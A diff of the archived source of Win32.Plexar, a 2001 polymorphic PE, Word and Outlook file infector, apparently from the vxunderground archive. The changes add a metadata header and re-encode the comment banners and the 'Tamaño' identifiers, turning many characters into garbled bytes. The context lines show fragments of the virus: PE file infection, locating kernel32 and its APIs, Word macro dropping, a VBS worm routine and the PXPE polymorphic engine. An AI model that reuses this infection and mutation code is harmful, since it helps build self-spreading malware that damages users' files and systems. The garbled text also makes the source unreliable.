@@ -1,6 +1,17 @@
+; ------------------------------------------------------------
+; name      Win32
+; type      engine
+; cve       Б─■
+; year      unknown
+; os        Multi
+; authors   unknown
+; source    vxunderground
+; archived  vxunderground, krisyotam (2026)
+; notes     Б─■
+; ------------------------------------------------------------
 
-; мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм
-;                             д< Win32.Plexar >д
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+;                             О©╫< Win32.Plexar >О©╫
 ;               Designed by LiteSys in Venezuela, South America
 ;
 ; PE/DOC/XLS/OUTLOOK Multithreaded Polymorphic Direct Action infector.
@@ -57,7 +68,7 @@
 ; Patria o Muerte: Venceremos.
 ; LiteSys.
 ; Venezuela, Julio/Agosto - (c) 2001
-; мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
 .586
 .MODEL FLAT, STDCALL
@@ -85,14 +96,14 @@ EXTRN MessageBoxExA:PROC
  Numero_Paginas                 EQU     32h
  K32_W9X                        EQU     0BFF70000h
  GPA_W9X                        EQU     0BFF76DACh
- Virus_Tama╓o                   EQU     (Termina_Plexar - Empieza_Plexar)
+ Virus_TamaО©╫o                   EQU     (Termina_Plexar - Empieza_Plexar)
 
  Titulo                         DB      "Plexar."
-                                DB      Virus_Tama╓o / 10000 MOD 10 + 30h
-                                DB      Virus_Tama╓o / 01000 MOD 10 + 30h
-                                DB      Virus_Tama╓o / 00100 MOD 10 + 30h
-                                DB      Virus_Tama╓o / 00010 MOD 10 + 30h
-                                DB      Virus_Tama╓o / 00001 MOD 10 + 30h
+                                DB      Virus_TamaО©╫o / 10000 MOD 10 + 30h
+                                DB      Virus_TamaО©╫o / 01000 MOD 10 + 30h
+                                DB      Virus_TamaО©╫o / 00100 MOD 10 + 30h
+                                DB      Virus_TamaО©╫o / 00010 MOD 10 + 30h
+                                DB      Virus_TamaО©╫o / 00001 MOD 10 + 30h
                                 DB      00h
 
  Mensaje                        DB      "Plexar (c) 2001 LiteSys "
@@ -175,7 +186,7 @@ Empieza_Plexar:
   HostBack                      DD      OFFSET Mentira
   RET
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; El Thread Principal, carga los otros threads.
 
@@ -260,7 +271,7 @@ Empieza_Plexar:
 
   Thread        ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; Payload.
 
@@ -341,7 +352,7 @@ Empieza_Plexar:
   RET
   Er_Pailon     ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; Proceso para buscar la base de KERNEL32
 
@@ -382,7 +393,7 @@ Empieza_Plexar:
 
   Busca_K32     ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
   DB            5 DUP (90h)
 
   ; Proceso para buscar a GetProcAddress
@@ -458,7 +469,7 @@ Empieza_Plexar:
 
   Busca_GPA     ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; ESI -> Donde Guardar las APIs
   ; EDI -> Cadenas de APIs
@@ -542,7 +553,7 @@ Empieza_Plexar:
 
   Busca_APIs    ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; Accion directa.
 
@@ -665,7 +676,7 @@ Empieza_Plexar:
   
   Directa       ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; Proceso para infectar un PE.
   ;
@@ -734,7 +745,7 @@ Empieza_Plexar:
   PUSH NULL
   PUSH EAX
   APICALL GetFileSize
-  MOV DWO [Tama╓o_1], EAX
+  MOV DWO [TamaО©╫o_1], EAX
   INC EAX
   JZ @PE_Close
   DEC EAX
@@ -742,8 +753,8 @@ Empieza_Plexar:
   CMP EAX, 8192d
   JB @PE_Close
 
-  ADD EAX, Virus_Tama╓o + 1400h
-  MOV DWO [Tama╓o_2], EAX
+  ADD EAX, Virus_TamaО©╫o + 1400h
+  MOV DWO [TamaО©╫o_2], EAX
 
   XOR EDX, EDX
   PUSH EDX
@@ -758,7 +769,7 @@ Empieza_Plexar:
   JZ @PE_Close
 
   XOR EDX, EDX
-  PUSH DWO [Tama╓o_2]
+  PUSH DWO [TamaО©╫o_2]
   PUSH EDX
   PUSH EDX
   PUSH FILE_MAP_WRITE
@@ -780,7 +791,7 @@ Empieza_Plexar:
   CMP EBX, DWO [BaseMap]
   JB @PE_UnMap
   MOV EDX, DWO [BaseMap]
-  ADD EDX, DWO [Tama╓o_1]
+  ADD EDX, DWO [TamaО©╫o_1]
   CMP EBX, EDX
   JA @Pe_UnMap
 
@@ -817,7 +828,7 @@ Empieza_Plexar:
 
   MOV EAX, DWORD PTR [ESI+08h]
   PUSH EAX
-  ADD EAX, Virus_Tama╓o + 400h
+  ADD EAX, Virus_TamaО©╫o + 400h
   MOV DWORD PTR [ESI+08h], EAX
 
   MOV EBX, DWORD PTR [EDI+3Ch]
@@ -854,20 +865,20 @@ Empieza_Plexar:
   MOV EDI, DWORD PTR [ESI+14h]
   ADD EDI, DWORD PTR [ESI+08h]
   ADD EDI, DWO [BaseMap]
-  MOV ECX, Virus_Tama╓o / 4
-  SUB EDI, Virus_Tama╓o + 400h
+  MOV ECX, Virus_TamaО©╫o / 4
+  SUB EDI, Virus_TamaО©╫o + 400h
   LEA ESI, OFS [Empieza_Plexar]
   CALL PXPE
 
-  PUSH DWO [Tama╓o_2]
-  POP DWO [Tama╓o_1]
+  PUSH DWO [TamaО©╫o_2]
+  POP DWO [TamaО©╫o_1]
 
   @PE_UnMap:
 
   XOR EAX, EAX
   PUSH EAX
   PUSH EAX
-  PUSH DWO [Tama╓o_1]
+  PUSH DWO [TamaО©╫o_1]
   PUSH DWO [FHandle]
   APICALL SetFilePointer
 
@@ -901,7 +912,7 @@ Empieza_Plexar:
 
   Infecta_PE    ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; Este proceso suelta en disco un archivo PE vacio.
   ;
@@ -995,7 +1006,7 @@ Empieza_Plexar:
   DB       "[ Hecho en Venezuela ]"
   DB       00h, 00h
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
  ; Proceso para soltar el virus macro de Word.
 
@@ -1092,7 +1103,7 @@ Empieza_Plexar:
   PUSH NULL
   PUSH EAX
   APICALL GetFileSize
-  MOV DWO [Tama╓o_IW], EAX
+  MOV DWO [TamaО©╫o_IW], EAX
   INC EAX
   JZ @IW_CierraFile
 
@@ -1121,7 +1132,7 @@ Empieza_Plexar:
 
   PUSH PAGE_READWRITE
   PUSH MEM_COMMIT + MEM_RESERVE + MEM_TOP_DOWN
-  MOV EAX, DWO [Tama╓o_IW]
+  MOV EAX, DWO [TamaО©╫o_IW]
   ADD EAX, EAX
   ADD EAX, 1000h
   PUSH EAX
@@ -1131,7 +1142,7 @@ Empieza_Plexar:
   OR EAX, EAX
   JZ @IW_Fin
 
-  MOV ECX, DWO [Tama╓o_IW]
+  MOV ECX, DWO [TamaО©╫o_IW]
   MOV EDI, EAX
   MOV ESI, DWO [BaseMap_IW]
 
@@ -1266,7 +1277,7 @@ Empieza_Plexar:
   APICALL CloseHandle
 
   PUSH MEM_DECOMMIT
-  MOV EAX, DWO [Tama╓o_IW]
+  MOV EAX, DWO [TamaО©╫o_IW]
   ADD EAX, EAX
   ADD EAX, 1000h
   PUSH EAX
@@ -1403,7 +1414,7 @@ Empieza_Plexar:
 
   Infecta_Word   ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   Worm_VBS       PROC Pascal            DeltaOfs:DWORD
 
@@ -1698,7 +1709,7 @@ Empieza_Plexar:
 
   Worm_VBS       ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   DB             "[" XOR 40h
   DB             "D" XOR 40h
@@ -1723,19 +1734,19 @@ Empieza_Plexar:
   DB             "]" XOR 40h
   DB                     40h
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
  ; PXPE: Plexar Polymorphic Engine: Another Lame Poly Written By Me.
  ;
  ; ESI -> Origen
  ; EDI -> Destino
- ; ECX -> Tama╓o
+ ; ECX -> TamaО©╫o
 
  PXPE           PROC
 
  MOV DWO [Origen], ESI
  MOV DWO [Destino], EDI
- MOV DWO [Tama╓o], ECX
+ MOV DWO [TamaО©╫o], ECX
 
  CALL @Inicializar_Semillas
 
@@ -1764,7 +1775,7 @@ Empieza_Plexar:
  CALL @Popear_Delta
  CALL @Basura
  CALL @Basura
- CALL @Meter_Tama╓o
+ CALL @Meter_TamaО©╫o
  CALL @Basura
  CALL @Basura
 
@@ -1804,7 +1815,7 @@ Empieza_Plexar:
  SUB DWORD PTR [EBX], EDX
 
  MOV ESI, DWO [Origen]
- MOV ECX, DWO [Tama╓o]
+ MOV ECX, DWO [TamaО©╫o]
  MOV EAX, DWO [Llave]
 
  @ReCopia:
@@ -1955,55 +1966,55 @@ Empieza_Plexar:
 
   RET
 
-  @Meter_Tama╓o:
+  @Meter_TamaО©╫o:
 
   PUSH 04h
   POP EBX
   CALL @Aleatorio
   OR EAX, EAX
-  JZ @Meter_Tama╓o_I
+  JZ @Meter_TamaО©╫o_I
   CMP EAX, 01h
-  JZ @Meter_Tama╓o_II
+  JZ @Meter_TamaО©╫o_II
   CMP EAX, 02h
-  JZ @Meter_Tama╓o_III
+  JZ @Meter_TamaО©╫o_III
   CMP EAX, 03h
-  JZ @Meter_Tama╓o_IV
+  JZ @Meter_TamaО©╫o_IV
 
-  JMP @Meter_Tama╓o_III
+  JMP @Meter_TamaО©╫o_III
 
-  @Meter_Tama╓oR:
+  @Meter_TamaО©╫oR:
 
   RET
 
-  @Meter_Tama╓o_I:
+  @Meter_TamaО©╫o_I:
    MOV AL, 0B9h
    STOSB
-   MOV EAX, DWO [Tama╓o]
+   MOV EAX, DWO [TamaО©╫o]
    STOSD
-   JMP @Meter_Tama╓oR
+   JMP @Meter_TamaО©╫oR
 
-  @Meter_Tama╓o_II:
+  @Meter_TamaО©╫o_II:
    MOV AL, 068h
    STOSB
-   MOV EAX, DWO [Tama╓o]
+   MOV EAX, DWO [TamaО©╫o]
    STOSD
    MOV AL, 059h
    STOSB
-   JMP @Meter_Tama╓oR
+   JMP @Meter_TamaО©╫oR
 
-  @Meter_Tama╓o_III:
+  @Meter_TamaО©╫o_III:
    MOV AL, 0BAh
    STOSB
-   MOV EAX, DWO [Tama╓o]
+   MOV EAX, DWO [TamaО©╫o]
    NOT EAX
    STOSD
    MOV AX, 0CA87h
    STOSW
    MOV AX, 0D1F7h
    STOSW
-   JMP @Meter_Tama╓oR
+   JMP @Meter_TamaО©╫oR
 
-  @Meter_Tama╓o_IV:
+  @Meter_TamaО©╫o_IV:
    XOR EBX, EBX
    DEC EBX
    CALL @Aleatorio
@@ -2017,12 +2028,12 @@ Empieza_Plexar:
    STOSB
    MOV AL, 035h
    STOSB
-   MOV EAX, DWO [Tama╓o]
+   MOV EAX, DWO [TamaО©╫o]
    XOR EAX, EDX
    STOSD
    MOV AL, 091h
    STOSB
-   JMP @Meter_Tama╓oR
+   JMP @Meter_TamaО©╫oR
 
   @Colocar_LEA:
 
@@ -2400,7 +2411,7 @@ Empieza_Plexar:
 
  Origen                         DD      00000000h
  Destino                        DD      00000000h
- Tama╓o                         DD      00000000h
+ TamaО©╫o                         DD      00000000h
 
  GuardaDelta                    DD      00000000h
  GuardaDelta2                   DD      00000000h
@@ -2413,7 +2424,7 @@ Empieza_Plexar:
 
  PXPE           ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
 ;***************************************************************
 ;*         aPLib v0.22b  -  the smaller the better :)          *
@@ -2533,7 +2544,7 @@ donedepacking:
     pop    ebp
     ret
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
  ; Billy Belcebu's CRC32 calculator.
  ;
@@ -2581,7 +2592,7 @@ donedepacking:
         ret
  CRC32          endp
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; Generador de numeros aleatorios para uso general.
   ;
@@ -2630,7 +2641,7 @@ donedepacking:
 
   Random        ENDP
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   ; TABLA!
   ;             
@@ -2787,7 +2798,7 @@ donedepacking:
   FHandle_IW                     DD     00000000h
   MHandle_IW                     DD     00000000h
   BaseMap_IW                     DD     00000000h
-  Tama╓o_IW                      DD     00000000h
+  TamaО©╫o_IW                      DD     00000000h
   Memoria_IW                     DD     00000000h
   Macaco                         DB      13d DUP (00h)
  
@@ -3003,8 +3014,8 @@ donedepacking:
   FHandle                       DD      00000000h
   MHandle                       DD      00000000h
   BaseMap                       DD      00000000h
-  Tama╓o_1                      DD      00000000h
-  Tama╓o_2                      DD      00000000h
+  TamaО©╫o_1                      DD      00000000h
+  TamaО©╫o_2                      DD      00000000h
   CRC_PLXR                      EQU     09EB7DF5h
 
   CRCNoInf                      DD      056B06AB2h
@@ -3169,7 +3180,7 @@ donedepacking:
 
   
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
   DB 10h DUP (90h)
 
